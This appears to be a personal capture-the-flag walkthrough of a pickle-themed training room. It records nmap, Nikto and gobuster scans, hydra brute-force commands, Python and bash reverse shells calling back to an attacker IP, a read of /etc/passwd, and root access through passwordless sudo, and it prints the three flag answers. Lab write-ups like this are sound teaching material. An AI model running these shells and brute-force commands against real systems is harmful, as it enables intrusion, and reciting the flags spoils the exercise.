@@ -1,0 +1,198 @@
+└─$ sudo nmap -Pn -A -oN nmap_scan 10.10.91.122         
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 04:48 EDT
+Nmap scan report for 10.10.91.122
+Host is up (0.050s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 3e:7f:30:81:ca:13:cf:a1:fa:b6:e7:f2:43:b3:cc:fe (RSA)
+|   256 42:90:8f:bc:d3:99:c1:25:9f:60:7a:c2:84:1d:6d:f2 (ECDSA)
+|_  256 52:c4:25:a5:79:10:fe:5e:0a:c0:a4:75:b2:72:7d:b0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=9/22%OT=22%CT=1%CU=41419%PV=Y%DS=2%DC=T%G=Y%TM=632C217
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
+OS:1NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+└─$ sudo nmap -Pn -p- 10.10.91.122
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 04:50 EDT
+Nmap scan report for 10.10.91.122
+Host is up (0.055s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+We found a comment on the html source code:
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+Nikto Find login:
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.91.122
++ Target Hostname:    10.10.91.122
++ Target Port:        80
++ Start Time:         2022-09-22 04:55:44 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Cookie PHPSESSID created without the httponly flag
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.php: Admin login page/section found.
++ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2022-09-22 05:04:13 (GMT-4) (509 seconds)
+
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.91.122/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/22 04:49:48 Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 313] [--> http://10.10.91.122/assets/]
+/server-status        (Status: 403) [Size: 300]                                  
+                                                       
+
+Exiftool every image and nothing
+
+Brute-force with hydra:
+
+hydra -l R1ckRul3s -P ~/SecLists-master/Passwords/Leaked-Databases/rockyou-30.txt 10.10.91.122 http-post-form '/login.php:username=^USER^&password=^PASS^&sub="Login":F=<label for="username">Username' -t 4 
+
+hydra -l R1ckRul3s -P ~/SecLists-master/Passwords/Common-Credentials/best1050.txt 10.10.91.122 http-post-form '/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password' -t 4 
+
+hydra -l R1ckRul3s -P ~/SecLists-master/Passwords/Leaked-Databases/rockyou.txt 10.10.91.122 http-post-form '/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password' -t 4
+
+At robots.txt:
+
+http://10.10.91.122/robots.txt
+Wubbalubbadubdub
+
+Brute force does not work, the password for the user is Wubbalubbadubdub
+
+We can use python or bash reverse shell command:
+
+export RHOST="10.9.1.56";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+bash -c 'bash -i >& /dev/tcp/10.9.1.56/4445 0>&1'
+
+then interactive:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo; fg
+<ENTER><ENTER>
+
+export SHELL=bash
+export TERM=xterm-256color
+
+
+
+Once we get in the system we got the first ingredient:
+
+cat Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+
+
+And a clue:
+
+cat clue.txt
+Look around the file system for the other ingredient.
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+
+In the /home/rick directory we have the second ingred:
+
+ls -la
+total 12
+drwxrwxrwx 2 root root 4096 Feb 10  2019 .
+drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
+-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
+www-data@ip-10-10-203-117:/home/rick$ cat *
+cat *
+1 jerry tear
+
+
+www-data@ip-10-10-254-175:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on
+    ip-10-10-254-175.eu-west-1.compute.internal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on
+        ip-10-10-254-175.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+
+
+This means that we can run all commands without entering our password.
+Since we can use sudo, then sudo su gives us root shell
+
+
+in /root we found our 3rd ingredient:
+
+root@ip-10-10-254-175:~# cat 3rd.txt 
+3rd ingredients: fleeb juice
